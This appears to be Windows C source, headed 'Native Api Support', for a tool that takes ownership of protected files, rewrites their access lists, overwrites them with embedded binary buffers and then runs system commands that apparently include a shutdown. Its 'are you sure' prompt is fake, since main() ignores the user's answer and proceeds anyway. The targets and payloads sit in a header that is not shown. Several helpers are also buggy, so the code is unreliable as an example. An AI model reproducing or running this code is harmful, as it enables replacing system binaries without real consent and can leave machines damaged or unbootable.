
/*
	Native Api Support
*/


#include "def.h"
#include "Nas.h"


FORCEINLINE
VOID
RtlInitUnicodeString(
	_In_ PUNICODE_STRING Dst,
	_In_ PWSTR Src
)
{
	Dst->Buffer = Src;
	Dst->MaximumLength = Dst->Length = wcslen(Src) * sizeof(WCHAR);
}


VOID
SeCreateFile(
	_In_ PCWSTR loc
)
{
	HANDLE d = CreateFile(L"\\\\.\\c:",
		GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ
		| FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	BY_HANDLE_FILE_INFORMATION i;
	HANDLE f = CreateFile(loc,
		GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, NULL);
	GetFileInformationByHandle(f, &i);
	CloseHandle(f);

	pNtCreateFile NtCreatefile = (
		pNtCreateFile)GetProcAddress(
			GetModuleHandle(L"ntdll.dll"), "NtCreateFile");
	pNtReadFile NtReadFile = (
		pNtReadFile)GetProcAddress(
			GetModuleHandle(L"ntdll.dll"), "NtReadFile");

	ULONG fid[2] = { i.nFileIndexLow, i.nFileIndexHigh };
	UNICODE_STRING fidstr = { 8, 8, (PWSTR)fid };

	OBJECT_ATTRIBUTES oa = { 0 };
	InitializeObjectAttributes(&oa, &fidstr,
		OBJ_CASE_INSENSITIVE, d, NULL);

	ULONG iosb[2];
	ULONG status = NtCreatefile(&f, GENERIC_ALL, &oa, iosb, NULL,
		FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, NULL, NULL, 0);
	UCHAR buf[11] = { 0 };
	LONG Off[2] = { 0 };
	CloseHandle(f);
	CloseHandle(d);
}


VOID
SeWriteFile(
	_In_ PCWSTR loc,
	_In_ LPCVOID Content,
	_In_ DWORD nByte
)
{
	HANDLE d = CreateFile(L"\\\\.\\c:",
		GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ
		| FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	BY_HANDLE_FILE_INFORMATION i;
	HANDLE f = CreateFile(loc, GENERIC_WRITE, 0,
		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	ULONG Byte;
	WriteFile(f, Content, nByte, &Byte, NULL);
	GetFileInformationByHandle(f, &i);
	CloseHandle(f);

	pNtCreateFile NtCreatefile = 
		(pNtCreateFile)GetProcAddress(
			GetModuleHandle(L"ntdll.dll"), "NtCreateFile");

	ULONG fid[2] = { i.nFileIndexLow, i.nFileIndexHigh };
	UNICODE_STRING fidstr = { 8, 8, (PWSTR)fid };

	OBJECT_ATTRIBUTES oa = { 0 };
	InitializeObjectAttributes(&oa, &fidstr, 
		OBJ_CASE_INSENSITIVE, d, NULL);

	ULONG iosb[2];
	ULONG status = NtCreatefile(&f, GENERIC_ALL, 
		&oa, iosb, NULL, FILE_ATTRIBUTE_NORMAL, 
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, NULL, NULL, 0);
	UCHAR buf[11] = { 0 };
	LONG Off[2] = { 0 };
	CloseHandle(f);
	CloseHandle(d);
}


BOOL
SeWriteReg(
	_In_ HKEY Root,
	_In_ LPCTSTR SubK,
	_In_ LPCTSTR lValu,
	_In_ LPCTSTR lDat
)
{
	HKEY hKey;
	BOOL bResult = FALSE;
	DWORD dwDisposition = 0;
	REGSAM samDesired = KEY_ALL_ACCESS;

	if (RegCreateKeyEx(
		Root,
		SubK,
		0,
		NULL,
		0,
		samDesired,
		NULL,
		&hKey,
		&dwDisposition
	) != ERROR_SUCCESS
		)
	{
		goto CLEANUP;
	}

	if (RegSetValueEx(
		hKey, lValu, 0, REG_SZ, (const PBYTE)lDat,
		(_tcslen(lDat) + 1) * sizeof(TCHAR)
	) != ERROR_SUCCESS
		)
	{
		bResult = FALSE;
	}

	bResult = TRUE;

CLEANUP:
	RegCloseKey(hKey);
	return bResult;
}


BOOL
SeCopyFile(
	_In_ LPCWSTR Src,
	_In_ LPCWSTR Dst
) {
	__try {
		CopyFileEx(
			Src,
			Dst,
			NULL,
			NULL,
			NULL,
			NULL
		);
		return TRUE;
	}
	__except (1) {
		return FALSE;
	}
}

BOOL
SeAdjustPrivilege(
	_In_ HANDLE hToken,
	_In_ LPCTSTR lpszPrivilege,
	_In_ BOOL bEnablePrivilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,
		lpszPrivilege,
		&luid))
	{
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;


	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		return FALSE;
	}

	return TRUE;
}


BOOL
SeTakeOwnership(
	_In_ LPTSTR lpszOwnFile,
	_In_ LPCTSTR oName,
	_In_ LPCTSTR nName
)
{

	BOOL bRetval = FALSE;
	HANDLE hToken = NULL;
	PSID pSIDAdmin = NULL;
	PSID pSIDEveryone = NULL;
	PACL pACL = NULL;
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld =
		SECURITY_WORLD_SID_AUTHORITY;
	SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
	EXPLICIT_ACCESS ea[2];
	DWORD dwRes;


	if (!AllocateAndInitializeSid(&SIDAuthWorld, 1,
		SECURITY_WORLD_RID,
		0,
		0, 0, 0, 0, 0, 0,
		&pSIDEveryone))
	{
		goto Cleanup;
	}


	if (!AllocateAndInitializeSid(&SIDAuthNT, 2,
		SECURITY_BUILTIN_DOMAIN_RID,
		DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&pSIDAdmin))
	{
		goto Cleanup;
	}
	pRtlSecureZeroMemory RtlSecureZeroMemory = (pRtlSecureZeroMemory)GetProcAddress(
		GetModuleHandle(L"ntdll.dll"), "RtlSecureZeroMemory");
	ZeroMemory(&ea, 2 * sizeof(EXPLICIT_ACCESS));


	ea[0].grfAccessPermissions = GENERIC_READ;
	ea[0].grfAccessMode = SET_ACCESS;
	ea[0].grfInheritance = NO_INHERITANCE;
	ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea[0].Trustee.ptstrName = (LPTSTR)pSIDEveryone;


	ea[1].grfAccessPermissions = GENERIC_ALL;
	ea[1].grfAccessMode = SET_ACCESS;
	ea[1].grfInheritance = NO_INHERITANCE;
	ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[1].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
	ea[1].Trustee.ptstrName = (LPTSTR)pSIDAdmin;

	if (ERROR_SUCCESS != SetEntriesInAcl(2,
		ea,
		NULL,
		&pACL))
	{
		goto Cleanup;
	}


	dwRes = SetNamedSecurityInfo(
		lpszOwnFile,                
		SE_FILE_OBJECT,             
		DACL_SECURITY_INFORMATION, 
		NULL, NULL,                  
		pACL,                       
		NULL);                      

	if (ERROR_SUCCESS == dwRes)
	{
		bRetval = TRUE;
		goto Cleanup;
	}
	if (dwRes != ERROR_ACCESS_DENIED)
	{
		goto Cleanup;
	}


	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES,
		&hToken))
	{
		goto Cleanup;
	}


	if (!SeAdjustPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, TRUE))
	{
		goto Cleanup;
	}


	dwRes = SetNamedSecurityInfo(
		lpszOwnFile,                
		SE_FILE_OBJECT,              
		OWNER_SECURITY_INFORMATION,
		pSIDAdmin,                   
		NULL,
		NULL,
		NULL);

	if (dwRes != ERROR_SUCCESS)
	{
		goto Cleanup;
	}


	if (!SeAdjustPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, FALSE))
	{
		goto Cleanup;
	}

	dwRes = SetNamedSecurityInfo(
		lpszOwnFile,                
		SE_FILE_OBJECT,             
		DACL_SECURITY_INFORMATION,  
		NULL, NULL,                  
		pACL,                        
		NULL);                       

	if (dwRes == ERROR_SUCCESS)
	{
		bRetval = TRUE;
	}
	else
	{
	}
	

Cleanup:
	MoveFile(
		oName,
		nName
	);
	if (pSIDAdmin)
		FreeSid(pSIDAdmin);

	if (pSIDEveryone)
		FreeSid(pSIDEveryone);

	if (pACL)
		LocalFree(pACL);

	if (hToken)
		CloseHandle(hToken);

	return bRetval;

}

VOID 
FixBin(
	_In_ LPCTSTR Patch,
	_In_ LPCTSTR Fix,
	_In_ LPCTSTR unlock
) {

	BOOL lRet = SeTakeOwnership(
		(LPTSTR)Patch,
		Patch,
		unlock
	);
	TCHAR Pch[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, Pch);
	lstrcat(Pch, Fix);
	BOOL bRet = CopyFile(
		Pch,
		Patch,
		FALSE
	);

}

VOID
main(
) {
	int y;
	printf("[w] are you sure you want to continue?\n");
	printf("[w] using this software is at your own risk\n");
	printf("[o] if you wish to continue enter 0\n");
	printf("[o] Exit other wise\n");
	scanf("%d",&y);
	FixBin(Patch1,Fix1,unLock1);
	SeWriteFile(Patch1,(LPCVOID)S32h,sSize);
	FixBin(Patch3,Fix1,unLock1);
	SeWriteFile(Patch3,(LPCVOID)S32h,sSize);
	FixBin(Patch2,Fix2,unLock2);
	SeWriteFile(Patch2,(LPCVOID)bBrd,bSize);
	system(MC);
	system(SRS);
	system(Shd);
}





